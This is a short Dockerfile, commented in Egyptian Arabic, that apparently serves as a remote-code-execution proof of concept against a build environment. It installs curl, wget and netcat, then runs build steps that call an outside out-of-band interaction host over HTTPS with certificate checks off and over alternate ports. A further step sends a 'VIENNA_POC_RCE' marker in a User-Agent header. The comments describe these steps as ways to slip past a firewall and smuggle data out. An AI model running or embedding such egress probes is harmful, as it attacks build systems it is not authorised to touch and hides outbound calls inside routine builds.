FROM alpine:latest

# 1. بننزل الأدوات
RUN apk add --no-cache curl wget netcat-openbsd

# --- المحاولة 1: الخروج عبر HTTPS (Port 443) ---
# الفايروول بيشوف ده ترافيك مشفر فممكن يعديه لأنه بورت 443
# -k عشان نتجاهل مشاكل الشهادة، -v عشان لو بتجرب محلي تشوف التفاصيل
RUN curl -k -v https://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro

# --- المحاولة 2: الخروج عبر بورتات بديلة (8080 & 8443) ---
# ساعات البورتات دي بتستخدم للبروكسي وبتكون مفتوحة
RUN curl -m 5 http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro:8080 || true
RUN curl -m 5 https://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro:8443 || true

# --- المحاولة 3: تهريب البيانات عبر User-Agent ---
# ساعات الفايروول بيبص على الـ URL بس، فبنحاول نبعت داتا في الهيدر
RUN curl -k -H "User-Agent: VIENNA_POC_RCE" https://google.com || true
